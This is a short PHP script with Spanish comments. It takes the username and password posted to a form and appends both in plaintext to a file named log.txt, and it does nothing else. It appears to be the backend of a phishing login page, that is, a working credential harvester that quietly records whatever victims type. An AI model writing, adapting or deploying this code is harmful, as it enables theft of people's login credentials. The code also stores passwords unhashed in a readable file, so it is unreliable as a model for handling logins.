<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Abrir el archivo log.txt en modo append
    $file = fopen('log.txt', 'a');

    // Escribir la información del usuario en el archivo log.txt
    fwrite($file, "Usuario: $username\nContraseña: $password\n\n");

    // Cerrar el archivo log.txt
    fclose($file);

   
}
?>
